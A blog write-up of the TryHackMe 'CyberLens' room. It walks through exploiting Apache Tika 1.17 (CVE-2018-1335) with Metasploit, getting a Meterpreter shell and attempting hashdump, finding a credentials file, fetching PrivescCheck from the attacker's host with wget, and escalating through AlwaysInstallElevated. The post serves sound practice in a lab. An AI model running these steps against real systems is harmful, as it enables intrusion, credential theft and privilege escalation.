---
title: "CyberLens TryHackMe Writeup"
published: 2024-05-24T12:05:12+10:00
lastUpdated: 2024-05-24T12:05:12+10:00
url: cyberlens
alias: # aliases for multiple
    - cyberLens-tryHackMe-writeup
    - 

cover:
    image: "<image path/url>"
    # alt: "<alt text>"
    # caption: "<text>"
    relative: false # To use relative path for cover image, used in hugo Page-bundles 

type: post # letter, note, page
categories: Writeup # Homelab, Writeup, Personal
tags:
    - TryHackMe
    - Writeup

draft: false

# ShowToc: false
# TocOpen: false

# searchHidden: true # Make false to hide page from search
---

Okay, it's been a while. Last writeup on the blog is [Chill Hack](https://mrash.co/chill-hack/)... but she (and other writeups) need a refresher.

Anyway, here's [CyberLens](https://tryhackme.com/r/room/cyberlensp6), a newish TryHackMe room from [Tyler Ramsbey](https://www.youtube.com/@TylerRamsbey) who make's great content, give them a follow/subscribe.

## The Challenge

First up, the Challenge Description.

```plain-text
Welcome to the clandestine world of CyberLens, where shadows dance amidst the digital domain and metadata reveals the secrets that lie concealed within every image. As you embark on this thrilling journey, prepare to unveil the hidden matrix of information that lurks beneath the surface, for here at CyberLens, we make metadata our playground.

In this labyrinthine realm of cyber security, we have mastered the arcane arts of digital forensics and image analysis. Armed with advanced techniques and cutting-edge tools, we delve into the very fabric of digital images, peeling back layers of information to expose the unseen stories they yearn to tell.

Picture yourself as a modern-day investigator, equipped not only with technical prowess but also with a keen eye for detail. Our team of elite experts will guide you through the intricate paths of image analysis, where file structures and data patterns provide valuable insights into the origins and nature of digital artifacts.

At CyberLens, we believe that every pixel holds a story, and it is our mission to decipher those stories and extract the truth. Join us on this exciting adventure as we navigate the digital landscape and uncover the hidden narratives that await us at every turn.

Can you exploit the CyberLens web server and discover the hidden flags?
```

I thought this room might be more 'image forensics' related, but I guess that's just the law of this CyberLens company.

(Tyler, is the description AI generated? It's okay if it is, no shame, just curious.)

There's a **Things to Note** which is nice. 

Add the `MACHINE_IP` to `/etc/hosts/` and wait 5 minutes. Done.

But the focus are two flags. 1) User, and 2) Administrator. 

A familiar room challenge. 

Perfect to get back into the swing of things. 

Let's go.

## Enumeration

Typically `rustscan` or `nmap` are normal starting points.

But since the description finished with "Can you exploit the CyberLens **web server** and discover the hidden flags?"

It's easier to start on port 80 via cyberlens[.]thm.

![CyberLens Website](https://i.imgur.com/Xjb7qCZ.jpeg)

With a quick look at WhatRuns and Wappalyzer, seems like an Apache Server running a basic html/css template on Bootstrap.

![Wappalyzer](https://i.imgur.com/1iT4X3m.png)

Nothing too interesting until scrolling down and seeing a form.

![CyberLens Website Form](https://i.imgur.com/9ZHgSAR.png)

And with a quick view-source, we've got an interesting end-point to look at.

![Web Form Showing Port 61777](https://i.imgur.com/0DFddsE.png)

Since the web form is fetching via 'http', perhaps we can see something via the browser?

![Apache Tika](https://i.imgur.com/hqOId3k.png)

Ah, some sort of Apache service, with a version number. Interesting.

So, from searching **Apache Tika** it's a **toolkit (that) detects and extracts metadata** from file types like PDFs etc.

I guess this feeds into the CyberLens description from earlier.

And from searching **Apache Tika 1.17 Exploit** we've got our *in*.

![Apache Tika 1.17 Exploit](https://i.imgur.com/1fWQ7ot.png)

So it's originally [CVE-2018-1335](https://nvd.nist.gov/vuln/detail/CVE-2018-1335) where a vulnerability "could be used to inject commands into the command line of the server running tika-server."

We can also use `searchsploit tika 1.17` if that's your cup of tea.

Looks like we have a Metasploit exploit ready to go, lovely.

## Initial Access

Okay, let's fire up this bad boy and see what we've got.

Use `msfconsole -q` and then `search tika` to find our exploit.

It's `exploit/windows/http/apache_tika_jp2_jscript` or type `use 0` when it's the first search item.

Set the following options with `set $option $value`:
- RHOSTS = $MACHINE_IP
- RPORT = 61777
- LHOST = $YOUR_IP

For example, `set LHOST 10.10.10.10` and then use `run` or `go` when you're ready.

The user flag hint "Sometimes exploits take a few tries before they are successful ;)" comes in here.

You may need to try this once or twice to get it working. Just check your exploit options are correct.

But when the exploit works and a session is created, you'll be greeted with:

![Metasploit Tika Exploit Session](https://i.imgur.com/fybpy7B.png)

We're in. Now what? Well first, who are we?

With a quick `whoami` we're the user `cyberlens`. Cool.

Then since we're in Meterpreter, there's extra luxuries to try, like:
- `sysinfo` for some system background.
- `getsystem` for a quick priv esc attempt... no luck there.
- `hashdump` for a sneaky SAM database dump... again, no luck.

Worth a quick try.

Otherwise, let's look around. Do what the kids call 'manual enumeration'.

We can also drop a normal shell on the system using `shell` and then enter PowerShell with `powershell`.

![Meterpreter Shell To PowerShell](https://i.imgur.com/vGEq0YN.png)

Here we can try some to see maybe some info about what we can do:
- `whoami /priv`
- `whoami /all`

![whoami priv and whoami all](https://i.imgur.com/YVc1k6n.png)

If you're like me, there's a few rabbit holes to explore.

What's `SeChangeNotifyPrivilege`? Does it give me anything? Nope.

Let's just look around then.

Some good places to check are:
- `C:\`
- `C:\Users`
- `C:\Windows\Temp`

Since we're in PowerShell, use `gci` to list out contents. 

(Oh PowerShell, your commands are so simple to remember.)

For example, `cd C:\Users\CyberLens` and `gci -recurse .`

![Recursive User Files](https://i.imgur.com/8WqfJFa.png)

Ah, interesting. 1) `user.txt`, and 2) `CyberLens-Management.txt`

![Displaying User Flag and CyberLens Credentials](https://i.imgur.com/cKWW22f.png)

Alright, now we have some credentials: `CyberLens:H************3`

## Privilege Escalation

I'll be honest. I got stuck here, like really stuck.

For me, the *hint* didn't help "RDP will make your life easier. If Remmina is not working, try this: rdesktop -u [user] -p [password] -N cyberlens.thm:3389"

Sticking with a PowerShell terminal was the way to go for me.

Let's try some automated enumeration now.

After a few rabbit holes, took a step back and watched [Windows Privilege Escalation Guide](https://youtu.be/w3v_ydcw3T4?si=llF_n2L0og3RkSon).

So tried a new (for me) script called [PrivesCheck](https://github.com/itm4n/PrivescCheck).

![Download PrivescCheck Script](https://i.imgur.com/kWKbJc2.png)

Start a Python Web Server with `python -m http.server 8000` where you download the script. 

![Transfer PrivescCheck Script](https://i.imgur.com/6LhBV1v.png)

On the Target Machine, put the script where you have write permissions. Like the Desktop.

Then you can use `wget http://$YOUR_IP:8000/$file -UseBasicParsing -OutFile $file`

Go ahead and run the script `. .\PrivescCheck.ps1; Invoke-PrivescCheck`

Gotta say, I do like the output of PrivescCheck. Easy to digest with the summary at the end.

![PrivescCheck Summary](https://i.imgur.com/k4wFGdl.png)

So what's `AlwaysInstallElevated`???

Luckily, [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation) has info about it.

And there's another metasploit exploit ready to rock for us. Lovely.

Exit PowerShell and go back to Meterpreter with `exit` and `exit`.

Then `bg` that session and type `use exploit/windows/local/always_install_elevated`.

![AlwaysInstallElevated Exploit](https://i.imgur.com/QWhWeN3.png)

![](https://i.imgur.com/iaY5jiw.png)

![](https://i.imgur.com/LfNUgUb.png)

![](https://i.imgur.com/RQWAVPO.png)

---

Thanks for reading
